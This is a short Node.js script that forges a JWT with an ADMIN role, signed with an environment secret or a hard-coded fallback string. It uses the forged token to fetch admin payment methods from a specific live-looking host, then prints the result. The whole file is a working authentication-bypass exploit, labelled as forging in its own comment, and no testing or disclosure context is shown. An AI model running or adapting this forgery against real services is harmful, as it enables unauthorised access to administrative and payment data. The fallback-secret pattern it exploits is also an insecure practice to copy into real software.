import fetch from 'node-fetch';
import jwt from 'jsonwebtoken';

async function run() {
  const baseUrl = 'https://vexora-1.ai.studio';
  const secret = process.env.JWT_SECRET || 'fallback-secret-for-development';
  
  // Forge an ADMIN token
  const token = jwt.sign({ userId: 'fake-admin-id', role: 'ADMIN' }, secret, { expiresIn: '7d' });
  console.log('Forged Token:', token);

  // Fetch admin payment methods
  const res = await fetch(`${baseUrl}/api/admin/payment-methods`, {
    headers: { 'Authorization': `Bearer ${token}` }
  });
  
  console.log('Status:', res.status);
  console.log('Body:', await res.text());
}
run().catch(console.error);
